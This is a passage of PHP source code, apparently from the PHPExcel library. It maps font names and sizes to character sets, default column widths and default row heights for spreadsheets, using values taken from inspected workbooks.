		$fontFile = self::$trueTypeFontPath . $fontFile;

		// Check if file actually exists
		if (!file_exists($fontFile)) {
			throw New PHPExcel_Exception('TrueType Font file not found');
		}

		return $fontFile;
	}

	/**
	 * Returns the associated charset for the font name.
	 *
	 * @param string $name Font name
	 * @return int Character set code
	 */
	public static function getCharsetFromFontName($name)
	{
		switch ($name) {
			// Add more cases. Check FONT records in real Excel files.
			case 'EucrosiaUPC':		return self::CHARSET_ANSI_THAI;
			case 'Wingdings':		return self::CHARSET_SYMBOL;
			case 'Wingdings 2':		return self::CHARSET_SYMBOL;
			case 'Wingdings 3':		return self::CHARSET_SYMBOL;
			default:				return self::CHARSET_ANSI_LATIN;
		}
	}

	/**
	 * Get the effective column width for columns without a column dimension or column with width -1
	 * For example, for Calibri 11 this is 9.140625 (64 px)
	 *
	 * @param PHPExcel_Style_Font $font The workbooks default font
	 * @param boolean $pPixels true = return column width in pixels, false = return in OOXML units
	 * @return mixed Column width
	 */
	public static function getDefaultColumnWidthByFont(PHPExcel_Style_Font $font, $pPixels = false)
	{
		if (isset(self::$defaultColumnWidths[$font->getName()][$font->getSize()])) {
			// Exact width can be determined
			$columnWidth = $pPixels ?
				self::$defaultColumnWidths[$font->getName()][$font->getSize()]['px']
					: self::$defaultColumnWidths[$font->getName()][$font->getSize()]['width'];

		} else {
			// We don't have data for this particular font and size, use approximation by
			// extrapolating from Calibri 11
			$columnWidth = $pPixels ?
				self::$defaultColumnWidths['Calibri'][11]['px']
					: self::$defaultColumnWidths['Calibri'][11]['width'];
			$columnWidth = $columnWidth * $font->getSize() / 11;

			// Round pixels to closest integer
			if ($pPixels) {
				$columnWidth = (int) round($columnWidth);
			}
		}

		return $columnWidth;
	}

	/**
	 * Get the effective row height for rows without a row dimension or rows with height -1
	 * For example, for Calibri 11 this is 15 points
	 *
	 * @param PHPExcel_Style_Font $font The workbooks default font
	 * @return float Row height in points
	 */
	public static function getDefaultRowHeightByFont(PHPExcel_Style_Font $font)
	{
		switch ($font->getName()) {
			case 'Arial':
				switch ($font->getSize()) {
					case 10:
						// inspection of Arial 10 workbook says 12.75pt ~17px
						$rowHeight = 12.75;
						break;

					case 9:
						// inspection of Arial 9 workbook says 12.00pt ~16px
						$rowHeight = 12;
						break;

					case 8:
						// inspection of Arial 8 workbook says 11.25pt ~15px
						$rowHeight = 11.25;
						break;

					case 7:
						// inspection of Arial 7 workbook says 9.00pt ~12px
						$rowHeight = 9;
						break;

					case 6:
					case 5:
						// inspection of Arial 5,6 workbook says 8.25pt ~11px
						$rowHeight = 8.25;
						break;

					case 4:
						// inspection of Arial 4 workbook says 6.75pt ~9px
						$rowHeight = 6.75;
						break;

					case 3:
						// inspection of Arial 3 workbook says 6.00pt ~8px
						$rowHeight = 6;
						break;

					case 2:
					case 1:
						// inspection of Arial 1,2 workbook says 5.25pt ~7px
						$rowHeight = 5.25;
						break;

					default:
						// use Arial 10 workbook as an approximation, extrapolation
						$rowHeight = 12.75 * $font->getSize() / 10;
						break;
				}
				break;

			case 'Calibri':
				switch ($font->getSize()) {
					case 11:
						// inspection of Calibri 11 workbook says 15.00pt ~20px
						$rowHeight = 15;
						break;

					case 10:
						// inspection of Calibri 10 workbook says 12.75pt ~17px
						$rowHeight = 12.75;
						break;

					case 9:
						// inspection of Calibri 9 workbook says 12.00pt ~16px
						$rowHeight = 12;
						break;

					case 8:
						// inspection of Calibri 8 workbook says 11.25pt ~15px
						$rowHeight = 11.25;
						break;

					case 7:
						// inspection of Calibri 7 workbook says 9.00pt ~12px
						$rowHeight = 9;
						break;

					case 6:
					case 5:
						// inspection of Calibri 5,6 workbook says 8.25pt ~11px
						$rowHeight = 8.25;
						break;

					case 4:
						// inspection of Calibri 4 workbook says 6.75pt ~9px
						$rowHeight = 6.75;
						break;

					case 3:
						// inspection of Calibri 3 workbook says 6.00pt ~8px
						$rowHeight = 6.00;
						break;

					case 2:
					case 1:
						// inspection of Calibri 1,2 workbook says 5.25pt ~7px
						$rowHeight = 5.25;
						break;

					default:
						// use Calibri 11 workbook as an approximation, extrapolation
						$rowHeight = 15 * $font->getSize() / 11;
						break;
				}
				break;

			case 'Verdana':
				switch ($font->getSize()) {
					case 10:
						// inspection of Verdana 10 workbook says 12.75pt ~17px
						$rowHeight = 12.75;
						break;

					case 9:
						// inspection of Verdana 9 workbook says 11.25pt ~15px
						$rowHeight = 11.25;
						break;

					case 8:
						// inspection of Verdana 8 workbook says 10.50pt ~14px
						$rowHeight = 10.50;
						break;

					case 7:
						// inspection of Verdana 7 workbook says 9.00pt ~12px
						$rowHeight = 9.00;
						break;

					case 6:
					case 5:
						// inspection of Verdana 5,6 workbook says 8.25pt ~11px
						$rowHeight = 8.25;
						break;

					case 4:
						// inspection of Verdana 4 workbook says 6.75pt ~9px
						$rowHeight = 6.75;
						break;

					case 3:
						// inspection of Verdana 3 workbook says 6.00pt ~8px
						$rowHeight = 6;
						break;

					case 2:
					case 1:
						// inspection of Verdana 1,2 workbook says 5.25pt ~7px
						$rowHeight = 5.25;
						break;

					default:
						// use Verdana 10 workbook as an approximation, extrapolation
						$rowHeight = 12.75 * $font->getSize() / 10;
						break;
				}
				break;

			default:
				// just use Calibri as an approximation
				$rowHeight = 15 * $font->getSize() / 11;
				break;
		}

		return $rowHeight;
	}

}
